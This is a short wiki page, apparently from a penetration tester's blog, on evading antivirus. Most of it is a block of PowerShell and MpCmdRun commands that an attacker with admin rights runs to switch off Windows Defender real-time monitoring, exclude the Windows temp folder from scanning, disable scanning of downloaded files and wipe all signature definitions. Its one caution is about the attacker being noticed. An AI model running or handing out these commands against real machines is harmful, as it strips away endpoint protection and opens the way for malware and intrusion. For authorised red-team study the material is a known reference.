---
title: "README !"
weight: 1
date: 2025-10-03
draft: false
type: wiki
---

Antivirus tend to flag malware by Signature/Heuristics detection, we could bypass these throughout certain techniques
For more details, look up into the [Exploit Development/Reversing/AV|EDR Bypass](https://ceso.github.io/2020/12/hacking-resources/#exploit-developmentreversingAV|EDR Bypass) Section on the resources part of my blog.

-----------------------------

# If NOT AV Bypass and Admin, DISABLE Defender

If we have admin creds, we could disable Win Defender, please note THIS IS NEVER a good idea in production environments as this can be monitored!!

```console
# Query if there is already an excluded path
  Get-MpPreference | select-object -ExpandProperty ExclusionPath
# Disable real time monitoring
  Set-MpPreference -DisableRealtimeMonitoring $true
# Exclude temp dir from monitoring by defender
  Add-MpPreference -ExclusionPath "C:\windows\temp"
# Disable Defender ONLY for downloaded files
  Set-MpPreference -DisableIOAVProtection $true
# Or REMOVE ALL Signature's but leave it enabled
  "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

-----------------------------
